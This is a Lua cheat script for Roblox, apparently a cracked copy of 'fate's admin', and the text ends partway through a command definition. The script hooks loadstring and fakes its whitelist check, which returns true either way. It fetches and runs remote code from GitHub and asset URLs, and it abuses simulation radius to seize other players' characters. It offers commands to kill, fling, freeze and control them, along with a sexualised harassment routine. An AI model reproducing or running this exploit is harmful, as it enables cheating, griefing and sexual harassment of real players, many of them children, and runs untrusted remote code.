local function AntiHttp()
local hookfunctionisgay     = loadstring;

getgenv().loadstring = function(...)
  for Idx, Val in next, ({...}) do
       warn("[ nil ]")
  end;
 
  return hookfunctionisgay(...);
end;
end

AntiHttp()

wait(0.5)

UserData = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
SubData = UserData:gsub("-", "")
AntiSpoofData = "hlshu32hdgajskasu3hjbdjhvsaghlshu32hdgajskasu3hjbdjhvsag332ggfff"
WL = game:HttpGetAsync("https://raw.githubusercontent.com/davidkra230/fates-admin-cracked/master/%2557%2548%2549%2554%2545%254c%2549%2553%2554")
Starter = game:GetService("StarterGui")

function SHA256(mes)
  local con = 4294967296
  local ch = {0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19}
  local k = {0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2}

  local function bit(obj, bit)
    return obj%(bit*2)>=bit
  end

  local function Or(ca, cb)
    local new = 0
    for i = 0, 32 do
      new = new+((bit(ca,2^i)or bit(cb,2^i))and 2^i or 0)
    end
    return new
  end

  local function rshift(obj, times)
    times = times or 1
    return math.floor(obj*.5^times)%con
  end

  local function lshift(obj, times)
    times = times or 1
    return math.floor(obj*2^times)%con
  end

  local function rrotate(obj,times)
    times = times or 1
    return Or(rshift(obj,times),lshift(obj,32-times))
  end

  local function And(ca, cb)
    local new = 0
    for i = 0, 32 do
      new = new+((bit(ca,2^i)and bit(cb,2^i))and 2^i or 0)
    end
    return new % 2^32
  end

  local function append(cur)
    local new = ""
    for i = 1, 8 do
      local r = cur%256
      new = string.char(r)..new
      cur = (cur-r)/256
    end
    return new
  end

  local function Not(ca)
    return (2^32-1)-ca
  end

  local function xor(ca, cb)
    local new = 0
    for i = 0, 32 do
      new = new+(bit(ca,2^i)~=bit(cb,2^i)and 2^i or 0)
    end
    return new%con
  end

  mes = mes.."\128"..("\0"):rep(64-((#mes+9)%64))..append(#mes*8)

  local Chunks = {}
  for i = 1, #mes, 64 do
    table.insert(Chunks,mes:sub(i,i+63))
  end
  for _,Chunk in next,Chunks do
    local w = {}
    for i = 0, 15 do
      w[i] = (function()local n=0 for q=1,4 do n=n*256+Chunk:byte(i*4+q) end return n end)()
    end
    for i = 16, 63 do
      local s0 = xor(xor(rrotate(w[i-15],7),rrotate(w[i-15],18)),rshift(w[i-15],3))
      local s1 = xor(xor(rrotate(w[i-2],17),rrotate(w[i-2],19)),rshift(w[i-2],10))
      w[i] = (w[i-16] + s0 + w[i-7] + s1)%con
    end
    local a,b,c,d,e,f,g,h=unpack(ch)
    for i = 0, 63 do
      local s0 = xor(xor(rrotate(a,2),rrotate(a,13)),rrotate(a,22))
      local s1 = xor(xor(rrotate(e,6),rrotate(e,11)),rrotate(e,25))
      local t0 = h+s1+xor(And(e,f),And(Not(e),g))+k[i+1]+w[i]
      local t1 = s0+xor(xor(And(a,b),And(a,c)),And(b,c))
      h = g
      g = f
      f = e
      e = (d+t0)%con
      d = c
      c = b
      b = a
      a = (t0+t1)%con
    end
    ch[1]=(ch[1]+a)%con
    ch[2]=(ch[2]+b)%con
    ch[3]=(ch[3]+c)%con
    ch[4]=(ch[4]+d)%con
    ch[5]=(ch[5]+e)%con
    ch[6]=(ch[6]+f)%con
    ch[7]=(ch[7]+g)%con
    ch[8]=(ch[8]+h)%con
  end
  return ("%08x%08x%08x%08x%08x%08x%08x%08x"):format(unpack(ch))
end

function Check(HWID)
 HWID = SHA256(HWID) 
 if string.find(WL, HWID) and string.find(WL, AntiSpoofData) then
     return true
 else
     return true
end
end

if Check(SubData) then
 Starter:SetCore("SendNotification", { Title = "Whitelisted!", Text = "Say /cmds for commands.", Duration = 10, })
else
 game.Players.LocalPlayer:Kick(" [ Invalid Whitelist ] ")
 return
end

loadstring(game:HttpGet"https://raw.githubusercontent.com/davidkra230/Network-Holder/master/NW")()
loadstring(game:HttpGet"https://raw.githubusercontent.com/davidkra230/fates-admin-cracked/master/CommandBar.lua")()

     local LP = game.Players.LocalPlayer
     local prefix = "."
     local start = tick()
     local synapse = syn and not is_sirhurt_closure

     if synapse then
            local function networkacces()
            local plrs = game:GetService("Players")
            local plr = plrs.LocalPlayer
            local Render = game:GetService("RunService").RenderStepped
            local SR = math.huge*math.huge
            local MSR = math.pow(math.huge,math.huge)
            settings().Physics.AllowSleep = false
            Render:Connect(function()
                sethiddenproperty(plr,'MaximumSimulationRadius',MSR)
                sethiddenproperty(plr,'SimulationRadius',SR)
            end)
        end
        networkacces()
        else
        loadstring(game:GetObjects("rbxassetid://5325226148")[1].Source)()
        wait()
        for i = 1,5 do
        game.Players.LocalPlayer.Character:BreakJoints()
       end
     end

    local function noti(title, text, duration)
    game.StarterGui:SetCore("SendNotification", {Title = title; Text = text; Duration = 10})
    end

    local function GC()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/cool6901/fates-admin-cracked/master/Commands.lua")()
    end
    
    local function NoclipCurrent()
    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
    if v:IsA("BasePart") then
    v.CanCollide = false
    end
    end
    end

    local function ClaimTag(Player)
    local C = Instance.new("BoolValue")
    C.Parent = Player.Character
    C.Name = "Claimed"
    end

    local function CheckClaim(Player)
    if Player.Character:FindFirstChild("Claimed") then return true else return false end
    end
    
    local function SetWs(Player, Amount)
    Player.Character.Humanoid.WalkSpeed = Amount
    end
    
    local function SetJp(Player, Amount)
    Player.Character.Humanoid.JumpPower = Amount
    end
    
    local function SetHh(Player, Amount)
    Player.Character.Humanoid.HipHeight = Amount
    end
    
    local function Kill(Player)
    Player.Character.Humanoid.Health = 0
    end

    local function Loopbring(Player)
        
    if not Player.Character:FindFirstChild("LoopBring") then
    local StartLoop = Instance.new("BoolValue")
    StartLoop.Name = "LoopBring"
    StartLoop.Parent = Player.Character
    end
    
    game:GetService("RunService").RenderStepped:Connect(function()
    if Player.Character:FindFirstChild("LoopBring") then
    Player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(5,0,0)
    end
    end)
    end

    local function Unloopbring(Player)
    if Player.Character:FindFirstChild("LoopBring") then
    Player.Character:FindFirstChild("LoopBring"):Destroy()
    end
    end

    GetSecond = function(PlayerString)
    local PlayerString = PlayerString:lower()
    local PlayerTable = Players:GetPlayers()
    if #PlayerString == 2 and PlayerString == "me" then return LP end
    if #PlayerString == 3 and PlayerString == "all" then return PlayerTable end
    for i = 1,#PlayerTable do 
    if PlayerTable[i].Name:lower():sub(1,#PlayerString) == PlayerString then
    return PlayerTable[i]
    end
    end 
    end
    
    function Mimic(Player)
    if CheckClaim(Player) == false then return end
    local O = Instance.new("BoolValue")
    O.Name = "O"
    O.Parent = Player.Character
    game:GetService("RunService").RenderStepped:Connect(function()
    if Player.Character:FindFirstChild("O") then
    THRP = Player.Character.HumanoidRootPart
    MHRPT = game.Players.LocalPlayer.Character.HumanoidRootPart
    THRP.CFrame = MHRPT.CFrame + Vector3.new(5, 0, 0)
    wait(0.1)
    THRP.CFrame = MHRPT.CFrame + Vector3.new(0, 0, 5)
    wait(0.1)
    THRP.CFrame = MHRPT.CFrame + Vector3.new(-5, 0, 0)
    wait(0.1)
    THRP.CFrame = MHRPT.CFrame + Vector3.new(0, 0, -5)
    wait(0.1)
    end
    end)
    end

    local function Fling(Player)
    Player.Character.Humanoid.Sit = true
    local a = Instance.new("BodyVelocity", Player.Character.Torso)
    a.Velocity = Vector3.new(100000000000,10000000000,1000000000)
    end
    
    local function Unmimic(Player)
    if Player.Character:FindFirstChild("O") then
    Player.Character:FindFirstChild("O"):Destroy()
    end
    end


    local function Disable(Player)
    Player.Character.Humanoid.PlatformStand = true
    end

    local function Enable(Player)
    Player.Character.Humanoid.PlatformStand = false
    end


    local function Orbit(Player)
      local OrbitTag = Instance.new("BoolValue")
      OrbitTag.Name = "Orbit"
      OrbitTag.Parent = Player.Character
      while Player.Character:FindFirstChild("Orbit") do
      Player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(5, 0, 0)
      wait(0.1)
      Player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 5)
      wait(0.1)
      Player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(-5, 0, 0)
      wait(0.1)
      Player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, -5)
      wait(0.1) 
      end
   end

   local function Unorbit(Player)
   if Player.Character:FindFirstChild("Orbit") then
      Player.Character:FindFirstChild("Orbit"):Destroy()
      end
   end
    
    function Freeze(Player)
    if CheckClaim(Player) == false then return end
    Player.Character.Head.Anchored = true
    Player.Character.Torso.Anchored = true
    end
    
    function Unfreeze(Player)
    if CheckClaim(Player) == false then return end
    Player.Character.Head.Anchored = false
    Player.Character.Torso.Anchored = false
    end

    local function Loopjump(Player)
        
    if not Player.Character:FindFirstChild("LoopJump") then
    local StartLoop = Instance.new("BoolValue")
    StartLoop.Name = "LoopJump"
    StartLoop.Parent = Player.Character
    end
    
    game:GetService("RunService").RenderStepped:Connect(function()
    if Player.Character:FindFirstChild("LoopJump") then
    Player.Character.Humanoid.Jump = true
    end
    end)
    end
    
    local function Control(Player)
    Player.Character.HumanoidRootPart.Parent = game.Players.LocalPlayer.Character
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
    end

    local function Goto(Player)
    local TP = Player.Character.HumanoidRootPart
    local CP = game.Players.LocalPlayer.Character.HumanoidRootPart
    CP.CFrame = TP.CFrame
    end

    local function Noclip(Player)
    local Char = Player.Character
    local Hum = Char.Humanoid
    if not Player.Character:FindFirstChild("NOCLIP") then
    local Status = Instance.new("BoolValue")
    Status.Name = "NOCLIP"
    Status.Parent = Char
    end

    game:GetService("RunService").Stepped:Connect(function()
      game:GetService("RunService").Stepped:Wait()
        if Char:FindFirstChild("NOCLIP") then
           Hum:ChangeState(11)
         end
      end)
    end

    local function Clip(Player)
    local Char = Player.Character
    if Char:FindFirstChild("NOCLIP") then
    Char:FindFirstChild("NOCLIP"):Destroy()
    end
    end

    local function Unloopjump(Player)
    if Player.Character:FindFirstChild("LoopJump") then
    Player.Character:FindFirstChild("LoopJump"):Destroy()
    end
    end

    local function Dildo(Player)
    local User = game:GetService("Players").LocalPlayer
    if not User.Character:FindFirstChild("Pal Hair") or not User.Character:FindFirstChild("Kate Hair") or not User.Character:FindFirstChild("Hat1") then return noti("[ fate's admin ]", "Error: you require PalHair, WomanHair and ManHair for this.") end

    local function rightarm()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["Right Arm"]
    item:BreakJoints()
            
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    local a0 = Instance.new("Attachment",item)
    local a1 = Instance.new("Attachment",character["Torso"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 200
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 200
    a0.Position = Vector3.new(-1.5, 1, 0.7)
    a0.Orientation = Vector3.new(-57.42, -180, -180)
    end
    local function handle()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["Pal Hair"].Handle
    item["Mesh"]:Destroy()
    item:BreakJoints()
    
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    a0 = Instance.new("Attachment",item)
    a1 = Instance.new("Attachment",character["Right Arm"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 200
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 200
                
    a0.Position = Vector3.new(0,1.4,0)
    a0.Orientation = Vector3.new(0, -90, 0)
    end
    local function dildo1()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["Kate Hair"].Handle
    item["Mesh"]:Destroy()
    item:BreakJoints()
    
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    a0 = Instance.new("Attachment",item)
    a1 = Instance.new("Attachment",character["Right Arm"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 200
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 200
                
    a0.Position = Vector3.new(0,0,-2.7)
    a0.Orientation = Vector3.new(90, -180, 0)
    end
    local function dildo2()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["Hat1"].Handle
    item["Mesh"]:Destroy()
    item:BreakJoints()
    
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    a0 = Instance.new("Attachment",item)
    a1 = Instance.new("Attachment",character["Right Arm"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 1000
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 1000
                
    a0.Position = Vector3.new(0,0,-4.7)
    a0.Orientation = Vector3.new(90, -180, 0)
    end

    rightarm()
    handle()
    dildo1()
    dildo2()

    local uis = game:GetService("UserInputService")
    uis.InputBegan:connect(function(inp, GP) if GP then return end
    if inp.KeyCode == Enum.KeyCode.K then
    if CheckClaim(Player) then
    Player.Character.Humanoid.Health = 0
    end
    end
    end)

    repeat
    wait()
    Player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(1.5,5,-5)
    until game.Players.LocalPlayer.Character.Humanoid.Health == 0 or Player.Character.Humanoid.Health == 0
    wait(1)
    game.Players.LocalPlayer.Character:Destroy()
    end

    local function Grab(PlayerL)
    local target = PlayerL.Character.HumanoidRootPart
    local lp = game.Players.LocalPlayer.Character.HumanoidRootPart
    _G.ungrab = false
    if not game.Players.LocalPlayer.Character:FindFirstChild("YandereKnife") then return noti("[ fate's admin ]", "Sorry you need the Yandere Knife for this!") end
    local function left()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["Left Arm"]
    item:BreakJoints()
            
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    local a0 = Instance.new("Attachment",item)
    local a1 = Instance.new("Attachment",character["Torso"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 200
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 200
    a0.Position = Vector3.new(0, 1, 1.5)
    a0.Orientation = Vector3.new(-90, -20, -50)
    end
            
    local function right()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["Right Arm"]
    item:BreakJoints()
            
            
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    local a0 = Instance.new("Attachment",item)
    local a1 = Instance.new("Attachment",character["Torso"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 200
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 200
            
    a0.Position = Vector3.new(-0.9, 1, -0.5)
    a0.Orientation = Vector3.new(-90, -20, -50)
            
    end
    local function knife()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["YandereKnife"].Handle
    item:BreakJoints()
            
            
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    a0 = Instance.new("Attachment",item)
    a1 = Instance.new("Attachment",character["Right Arm"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 200
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 200
            
    a0.Position = Vector3.new(-0.8,0,1)
    a0.Orientation = Vector3.new(0, -90, -90)
    end
    for i = 1, 5 do
    knife()
    left()
    right()
    end
    noti("[ fate's admin ]", "Press k to kill, will reset you after.")
    local uis = game:GetService("UserInputService")
    uis.InputBegan:connect(function(inp, GP) if GP then return end
    if inp.KeyCode == Enum.KeyCode.K then
    if CheckClaim(PlayerL) then
    PlayerL.Character.Humanoid.Health = 0
    for i = 1,5 do
    _G.ungrab = true
    end
    end
    end
    if _G.ungrab then
    local function larm()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["Left Arm"]
    item:BreakJoints()
            
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    local a0 = Instance.new("Attachment",item)
    local a1 = Instance.new("Attachment",character["Torso"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 200
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 200
    a0.Position = Vector3.new(1.5, 0, 0)
    a0.Orientation = Vector3.new(0, 0, 0)

    end
            
    local function rarm()
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    local item = character["Right Arm"]
    item:BreakJoints()
            
            
    local alignOr = Instance.new("AlignOrientation",character["Head"])
    local alignPosition = Instance.new("AlignPosition",character["Head"])
    local a0 = Instance.new("Attachment",item)
    local a1 = Instance.new("Attachment",character["Torso"])
    alignPosition.Attachment0 = a0
    alignPosition.Attachment1 = a1
    alignPosition.Responsiveness = 200
    alignOr.Attachment0 = a0
    alignOr.Attachment1 = a1
    alignOr.Responsiveness = 200
            
    a0.Position = Vector3.new(-1.5, 0, 0)
    a0.Orientation = Vector3.new(0, 0, 0)
    end
    for i = 1, 20 do
    larm()
    rarm()
    end
    _G.ungrab = false
    wait(2)
    game.Players.LocalPlayer.Character:Destroy()
    end
    end)
    repeat
    wait()            
    target.CFrame = lp.CFrame * CFrame.new(-0.7,0,-1.15)
    until _G.ungrab == true
    end

    local gPlayers = game:GetService("Players")
    local admin = gPlayers.LocalPlayer.Name
    local user = gPlayers.LocalPlayer
    local cmdprefix = '/'
    local scriptprefix = '/'
    local split        = " "

        local admins = {}
        local services={}
        local cmds={}
        local std={}
        
        
        --[[
        services
        ]]
        
        services.players=gPlayers
        services.lighting=game:GetService('Lighting')
        services.workspace=game:GetService('Workspace')
        services.events = {}
        
        --[[ 
        FUNCTIONS
        ]]
        
        updateevents=function()
            for i,v in pairs(services.events) do services.events:remove(i) v:disconnect() end
            for i,v in pairs(gPlayers:players())do
            local ev = v.Chatted:connect(function(msg)  do_exec(msg,v) end) -- msg = string.gsub(msg, "\r", "")
            services.events[#services.events+1] = ev
            end
        end
            
        std.inTable=function(tbl,val)
            if tbl==nil then return false end
            
            for _,v in pairs(tbl)do
            if v==val then return true end
            end 
          return false
        end
            
        std.out=function(str)
          print(str)
        end
            
        std.list=function(tbl) --turns table into list with commas
            local str=''
            for i,v in pairs(tbl)do
            str=str..tostring(v)
            if i~=#tbl then str=str..', ' end
            end 
           return str
        end
            
        std.endat=function(str,val)
            local z=str:find(val)
            if z then 
            return str:sub(0,z-string.len(val)),true
            else 
            return str,false 
           end
        end
            
        std.first=function(str) return str:sub(1,1) end    
            isAdmin=function(name)
            if name==admin then
            return true
            elseif admins[name]==true then
            return true
            end
           return false
        end
            
        local exec=function(str)
            spawn(function()
            local script, loaderr = loadstring(str)
            if not script then
            error(loaderr)
            else
            script()
             end
          end)
        end
            
        local findCmd=function(cmd_name)
            for i,v in pairs(cmds)do
            if v.NAME:lower()==cmd_name:lower() or std.inTable(v.ALIAS,cmd_name:lower())then
            return v
            end
          end
        end
            
        local getCmd=function(msg)
            local cmd,hassplit=std.endat(msg:lower(),split)
            if hassplit then 
            return {cmd,true} 
            else 
            return {cmd,false}
           end
        end
            
        local getprfx=function(strn)
            if strn:sub(1,string.len(cmdprefix))==cmdprefix then return{'cmd',string.len(cmdprefix)+1}
            elseif strn:sub(1,string.len(scriptprefix))==scriptprefix then return{'exec',string.len(scriptprefix)+1}
           end return
        end
            
        local getArgs=function(str)
            local args={}
            local new_arg=nil
            local hassplit=nil
            local s=str
            repeat
            new_arg,hassplit=std.endat(s:lower(),split)
            if new_arg~='' then
            args[#args+1]=new_arg
            s=s:sub(string.len(new_arg)+string.len(split)+1)
            end
            until hassplit==false
           return args
        end
            
        local function execCmd(str, plr)
            local s_cmd
            local a
            local cmd
            s_cmd = getCmd(str) 
            cmd = findCmd(s_cmd[1]) 
            if cmd == nil then return end
            a = str:sub(string.len(s_cmd[1]) + string.len(split) + 1)
            local args=getArgs(a)
            
            pcall(function()
            cmd.FUNC(args, plr)
           end)
        end
            
        function do_exec(str,plr)
            if not isAdmin(plr.Name)then return end  
            str=str:gsub('/e ','')
            local t=getprfx(str)
            if t==nil then return end
            str=str:sub(t[2])
            if t[1]=='exec' then
            exec(str)
            elseif t[1]=='cmd' then
            execCmd(str, plr)
           end
        end
            
        updateevents()
            _G.exec_cmd = execCmd
            --game.Players.LocalPlayer.Chatted:connect(doexec)
            
            local _char=function(plr_name)
            for i,v in pairs(game.Players:GetChildren())do
            if v:IsA'Player'then
            if v.Name==plr_name then return v.Character end
            end
            end
           return
        end
            
        local _plr=function(plr_name)
            for i,v in pairs(game.Players:GetChildren())do
            if v:IsA'Player'then
            if v.Name==plr_name then return v end
            end
            end
           return
        end
            
        function CMD(name,desc,alias,func)
            cmds[#cmds+1]=
            {
            NAME=name;
            DESC=desc;
            ALIAS=alias;
            FUNC=func;
            }
        end
            
        local function getPlayer(name)
            local nameTable = {}
            name=name:lower()
            if name == "me" then
            return {admin}
            elseif name == "others" then
            for i,v in pairs(gPlayers:GetChildren()) do
            if v:IsA'Player'then
            if v.Name~=admin then
            nameTable[#nameTable+1]=v.Name
            end
          end
        end
            elseif name == "all" then
            for i,v in pairs(gPlayers:GetChildren()) do
            if v:IsA'Player'then 
            nameTable[#nameTable+1]=v.Name
            end
            end
            else
            for i,v in pairs(gPlayers:GetChildren()) do
            local lname = v.Name:lower()
            local i,j = lname:find(name)
            if i == 1 then
            return {v.Name}
          end
         end
        end
          return nameTable
        end


CMD(
'Claim',
'Claims a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
    ClaimTag(gPlayers[v])
    local plr = game:GetService("Players").LocalPlayer
    local char = plr.Character
    local oldpos = char:WaitForChild("HumanoidRootPart").CFrame
    local plr = game.Players.LocalPlayer;
    local chr = plr.Character;
    local hum = chr.Humanoid;

    workspace.FallenPartsDestroyHeight = 0/1/0

    for i,v in pairs(plr.Backpack:GetChildren()) do
    if v:IsA("Tool") then
    v.Parent = char
    end
    end

    char:WaitForChild("Humanoid"):Remove()
    Instance.new("Humanoid", char)
    char:WaitForChild("Head"):Destroy()
    spawn(function()
    
    while game:GetService("RunService").Heartbeat:wait(0.000000e+9) do
    char:WaitForChild("HumanoidRootPart").CFrame = gPlayers[v].Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.new(-1,0,1)
    end
    end)

    for a,b in pairs(char:GetChildren()) do
    if b:IsA("Tool") then
    b.Parent = plr.Backpack
    end
    end

    for _,x in pairs(plr.Backpack:GetChildren()) do
    if x:IsA("Tool") then
    x.Parent = char
    end
    end

    for i = 1,10 do
    wait(0.000000e+9)
    char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(0,-99999999,0)
    end

    for i = 1,10 do
    wait()
    char:WaitForChild("HumanoidRootPart").CFrame = oldpos
    end

    char:WaitForChild("HumanoidRootPart"):Destroy()
    char:WaitForChild("Torso"):Destroy()
    char:WaitForChild("Right Arm"):Destroy()
    char:WaitForChild("Left Arm"):Destroy()
    char:WaitForChild("Right Leg"):Destroy()
    char:WaitForChild("Left Leg"):Destroy()
    for i = 1,10 do
    wait()
    char:WaitForChild("HumanoidRootPart").CFrame = oldpos
    end
  end
end)

CMD(
'Ws',
'Changes a claimed players walkspeed',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      SetWs(gPlayers[v], args[2])
    end
  end
end)

CMD(
'Jp',
'Changes a claimed players jumppower',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      SetJp(gPlayers[v], args[2])
    end
  end
end)

CMD(
'Hh',
'Changes a claimed players jumppower',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      SetHh(gPlayers[v], args[2])
    end
  end
end)

CMD(
'Kill',
'Kills a claimed player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Kill(gPlayers[v])
    end
  end
end)

CMD(
'Bring',
'Brings a claimed player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      local Player = gPlayers[v]
      local Client = game:GetService("Players").LocalPlayer
      local TP = Player.Character.HumanoidRootPart
      local CP = Client.Character.HumanoidRootPart
      TP.CFrame = CP.CFrame * CFrame.new(5,0,0)
    end
  end
end)

CMD(
'Tween',
'Tween Brings a claimed player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      local Player = gPlayers[v]
      local Client = game:GetService("Players").LocalPlayer
      local TP = Player.Character.HumanoidRootPart
      local CP = Client.Character.HumanoidRootPart
      for lerp = 0,1,.01 do
        TP.CFrame = TP.CFrame:lerp(CP.CFrame, lerp)
      wait()
      end
    end
  end
end)

CMD(
'Tp',
'Teleports a claimed player to a player of your choice',
{nil},
function(args)
   local Target = getPlayer(args[1])
   local Second = getPlayer(args[2])
    if CheckClaim(gPlayers[Target[1]]) then
     local T = gPlayers[Target[1]]
     local S = gPlayers[Second[1]]
     T.Character.HumanoidRootPart.CFrame = S.Character.HumanoidRootPart.CFrame * CFrame.new(5,0,0)
  end
end)

CMD(
'dmode',
'GrabKnife on a claimed player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Dildo(gPlayers[v])
     end
  end
end)

CMD(
'Grab',
'GrabKnife on a claimed player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Grab(gPlayers[v])
     end
  end
end)

CMD(
'Freeze',
"Freeze's claimed player",
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Freeze(gPlayers[v])
     end
  end
end)

CMD(
'Unfreeze',
"Unfreeze's claimed player",
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Unfreeze(gPlayers[v])
     end
  end
end)

CMD(
'Goto',
"Teleports you to a player",
{nil},
function(args)
local Target = getPlayer(args[1])
  for i, v in pairs(Target) do
    Goto(gPlayers[v])
  end
end)

CMD(
'Mimic',
"mimic's claimed player",
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Mimic(gPlayers[v])
     end
  end
end)

CMD(
'Unmimic',
"Unmimic's claimed player",
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Unmimic(gPlayers[v])
     end
  end
end)

CMD(
'noclip',
"noclip's claimed player",
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Noclip(gPlayers[v])
     end
  end
end)

CMD(
'clip',
"clip's claimed player",
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Clip(gPlayers[v])
     end
  end
end)

CMD(
'Control',
"control's claimed player",
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Control(gPlayers[v])
     end
  end
end)

CMD(
'Fling',
"Flings's claimed player",
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Fling(gPlayers[v])
     end
  end
end)

CMD(
'Loopjump',
'Loop jumps a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
